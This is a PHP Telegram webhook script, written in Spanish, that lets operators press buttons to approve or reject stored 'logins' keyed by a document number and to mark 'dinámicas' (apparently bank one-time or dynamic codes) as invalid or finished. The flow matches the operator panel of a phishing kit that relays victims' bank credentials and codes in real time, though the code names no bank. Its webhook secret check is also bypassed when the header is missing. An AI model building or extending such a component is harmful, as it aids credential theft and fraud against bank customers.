<?php

require_once __DIR__ . '/config.php';
require_once __DIR__ . '/storage.php';
$botToken   = $BOT_TOKEN;

$incomingToken = $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] ?? '';
if (!empty($incomingToken) && !empty($WEBHOOK_SECRET) && !hash_equals($WEBHOOK_SECRET, $incomingToken)) {
    http_response_code(403);
    exit('Unauthorized');
}

$content = file_get_contents("php://input");
$update  = json_decode($content, true);

if (!$update) {
    http_response_code(200);
    echo "OK";
    exit;
}

if (!isset($update['callback_query'])) {
    http_response_code(200);
    echo "OK";
    exit;
}

$cb       = $update['callback_query'];
$cdata    = isset($cb['data']) ? $cb['data'] : '';
$cbId     = isset($cb['id']) ? $cb['id'] : '';
$from     = isset($cb['from']) ? $cb['from'] : [];
$fromName = trim(
    (($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''))
);
if ($fromName === '') {
    $fromName = $from['username'] ?? 'Usuario';
}

$message      = $cb['message'] ?? null;
$messageId    = $message['message_id'] ?? null;
$chatIdOrigen = $message['chat']['id'] ?? null;

function tgApiGet($method, $params) {
    global $botToken;
    $url = "https://api.telegram.org/bot{$botToken}/{$method}?" . http_build_query($params);
    return file_get_contents($url);
}

if (strpos($cdata, 'login_ok:') === 0 || strpos($cdata, 'login_error:') === 0) {
    list($accion, $doc) = explode(':', $cdata, 2);

    $logins = storage_get_data('logins.json');
    if (isset($logins[$doc])) {
        $logins[$doc]['estado'] = ($accion === 'login_ok') ? 'ok' : 'error';
        storage_save_data('logins.json', $logins);
    }

    $txtCallback = ($accion === 'login_ok') ? 'Login aprobado' : 'Login rechazado';

    if ($cbId) {
        tgApiGet('answerCallbackQuery', [
            'callback_query_id' => $cbId,
            'text'              => $txtCallback,
            'show_alert'        => false
        ]);
    }

    if ($messageId && $chatIdOrigen) {
        $nuevoTexto = $message['text'] . "\n\n👤 Acción de login '" . $txtCallback . "' realizada por <b>" . htmlspecialchars($fromName, ENT_QUOTES, 'UTF-8') . "</b>.";

        tgApiGet('editMessageText', [
            'chat_id'                  => $chatIdOrigen,
            'message_id'               => $messageId,
            'text'                     => $nuevoTexto,
            'parse_mode'               => 'HTML',
            'reply_markup'             => json_encode(['inline_keyboard' => []])
        ]);
    }

    http_response_code(200);
    echo "OK";
    exit;
}

if (strpos($cdata, 'dina_x:') === 0 || strpos($cdata, 'dina_finish:') === 0) {
    list($accion, $idDina) = explode(':', $cdata, 2);

    $din = storage_get_data('dinamicas.json');
    if (isset($din[$idDina])) {
        $din[$idDina]['estado'] = ($accion === 'dina_x') ? 'error' : 'ok';
        storage_save_data('dinamicas.json', $din);
    }

    $txtCallback = ($accion === 'dina_x') ? 'Dinámica inválida' : 'Dinámica finalizada';

    if ($cbId) {
        tgApiGet('answerCallbackQuery', [
            'callback_query_id' => $cbId,
            'text'              => $txtCallback,
            'show_alert'        => false
        ]);
    }

    if ($messageId && $chatIdOrigen) {
        $nuevoTexto = $message['text'] . "\n\n👤 Acción sobre dinámica '" . $txtCallback . "' realizada por <b>" . htmlspecialchars($fromName, ENT_QUOTES, 'UTF-8') . "</b>.";

        tgApiGet('editMessageText', [
            'chat_id'      => $chatIdOrigen,
            'message_id'   => $messageId,
            'text'         => $nuevoTexto,
            'parse_mode'   => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ]);
    }

    http_response_code(200);
    echo "OK";
    exit;
}

http_response_code(200);
echo "OK";
